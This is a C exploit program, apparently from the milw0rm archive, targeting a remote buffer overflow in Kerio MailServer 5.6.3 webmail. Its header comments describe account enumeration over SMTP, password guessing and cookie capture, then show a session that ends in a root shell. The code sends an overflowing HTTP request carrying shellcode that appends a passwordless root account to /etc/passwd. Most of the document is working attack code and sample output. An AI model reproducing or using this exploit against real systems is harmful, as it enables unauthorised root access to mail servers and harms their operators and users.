/* Remote Buffer Overflow Exploit for Kerio MailServer 5.6.3   */
/* ========================================= */
/*	                        By B-r00t                                  */
/*				                       */
/* In response to the Kerio Mailserver vulnerabilities              */
/* discovered by David F.Madrid.			       */
/*	                                                                       */
/* Although this exploit requires valid authentication	       */
/* details, it is possible to use 'RCPT TO' to enumerate         */
/* valid accounts 'A La Sendmail' as shown below: -	       */
/*

$ telnet 192.168.0.10 25
Trying 192.168.0.10...
Connected to 192.168.0.10.
Escape character is '^]'.
220 dhcp-185-45 Kerio MailServer 5.6.3 ESMTP ready
mail from: Br00t@host.net
250 2.1.0 Sender <Br00t@host.net> ok

rcpt to: nosuchuser@host.net
550 5.1.1 Mailbox <nosuchuser@host.net> does not exist
rcpt to:admin@host.net
250 2.1.5 Recipient <admin@host.net> ok (local) << default 
admin account.
rcpt to: fred@host.net
250 2.1.5 Recipient <fred@host.net> ok (local) << user fred 
seems to exist.

rset
250 2.0.0 Reset state
quit
221 2.0.0 SMTP closing connection
Connection closed by foreign host.

*/
/* Using a dictionary attack to obtain a large number      */
/* of accounts in conjunction with users  natural              */
/* stupidity for using easy to guess passwords should	*/
/* yield at least one valid account.		*/
/*					*/
/* Once an account has been cracked, login to the	*/
/* Kerio webmail service and record the 'userid' 	*/
/* cookie value: -				*/
/*
$ lynx 192.168.0.10
   Username: fred___________
   Password: _______________
   OK


192.168.0.10 cookie: userid=7dc1700017e708a5  Allow? (Y/N/Always/neVer)
*/
/* Accept the cookie 'Y' to ensure you are fully	*/
/* logged in to the Kerio webmail service.		*/
/*

[br00t@silvia:~] $ ./keriobaby 192.168.0.10 userid=7dc1700017e708a5

Payload: 408 / 408 bytes


Wall0p! ... !!!


If successful a UID 0 Account 'keriohacker'
has been appended to /etc/passwd. Use 'ssh'
or 'su' (if local) to get r00t! ....

[br00t@silvia:~] $ ssh -l keriohacker 192.168.0.10
Last login: Thu Jun  5 08:21:30 2003

sh-2.05# id
uid=0(root) gid=0(root) groups=0(root)
sh-2.05# tail -1 /etc/passwd
keriohacker::0:0:B-r00t~R0x~Y3r~W0rld!.:/tmp:/bin/sh
sh-2.05#

*SSH assumes: PermitRootLogin yes & PermitEmptyPasswords yes
Alternative: Recode the shellcode to add normal user!
That's All Folks ...
ENJOY!
*/


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DEST_PORT 80

int main ( int argc, char *argv[] )
{
int socketfd, bytes;
struct sockaddr_in dest_addr;

char buffer[700];
// char ret[] = "\x07\xf7\x7f\xbe"; // Use this if attached with GDB
char ret[] = "\x07\xf7\xff\xbe"; // RedHat Linux 7.2 + 
kerio-mailserver-mcafee-5.6.3-rh7.i386.rpm
char *ptr = buffer;
char req[] = "GET /list?folder=~";
char cr[] = "\x0D\x0A";

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// Fat Bloke Shellcode to avoid HTTP chars by B-r00t..
// Appends: keriohacker::0:0:B-r00t~R0x~Y3r~W0rld!.:/tmp:/bin/sh
"\xeb\x55\x5e\xb0\xff\x2c\xd0\x88\x06\x88\x46\x04\x88\x46\x34"
"\x88\x46\x39\x88\x46\x3d\x31\xc0\x88\x46\x0b\x88\x46\x41\x66"
"\xb8\x0b\x27\x66\x2d\x01\x27\x66\x89\x46\x40\x8d\x5e\x0c\x89"
"\x5e\x42\xb0\x05\x8d\x1e\x66\xb9\x42\x04\x66\xba\xe4\x01\xcd"
"\x80\x89\xc3\xb0\x04\x8b\x4e\x42\x31\xd2\xb2\xff\x80\xea\xca"
"\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xa6\xff"
"\xff\xff\x58\x65\x74\x63\x58\x70\x61\x73\x73\x77\x64\x58\x6b"
"\x65\x72\x69\x6f\x68\x61\x63\x6b\x65\x72\x3a\x3a\x30\x3a\x30"
"\x3a\x42\x2d\x72\x30\x30\x74\x7e\x52\x30\x78\x7e\x59\x33\x72"
"\x7e\x57\x30\x72\x6c\x64\x21\x2e\x3a\x58\x74\x6d\x70\x3a\x58"
"\x62\x69\x6e\x58\x73\x68\x58\x58\x41\x41\x41\x41"
"\x90\x90\x90\x90\x90\x90";

memset (buffer, '\0', sizeof (buffer));

if (argc < 3) {
        printf("\nUsage: %s [IP_ADDRESS] [COOKIE]", argv[0]);
        printf("\nExample: %s 10.0.0.1 userid=771c740df0270936\n", 
argv[0]);
	exit (1);
        }

printf ("\nPayload: %d / 408 bytes\n\n", strlen(shellcode));

strcpy (buffer, req);
strcat (buffer, shellcode);
strcat (buffer, ret);
strcat (buffer, ret);
strcat (buffer, " HTTP/1.0");
strcat (buffer, cr);
strcat (buffer, "Cookie: ");
strcat (buffer, argv[2]);
strcat (buffer, cr);
strcat (buffer, cr);

if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror("Socket");
        exit (1);
        }

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DEST_PORT);
if (! inet_aton(argv[1], &(dest_addr.sin_addr))) {
        perror("inet_aton problems");
        exit (2);
        }

memset( &(dest_addr.sin_zero), '\0', 8);

if (connect (socketfd, (struct sockaddr *)&dest_addr, sizeof (struct 
sockaddr)) == -1){
        perror("connect failed");
        close (socketfd);
        exit (3);
        }


bytes = (send (socketfd, ptr, strlen(buffer), 0));
if (bytes == -1) {
        perror("send error");
        close (socketfd);
        exit(4);
        }

close (socketfd);
printf ("\nWall0p! ... !!!\n\n");
printf ("\nIf successful a UID 0 Account 'keriohacker'");
printf ("\nhas been appended to /etc/passwd. Use 'ssh'");
printf ("\nor 'su' (if local) to get r00t! ....\n\n");

}

// milw0rm.com [2003-06-27]
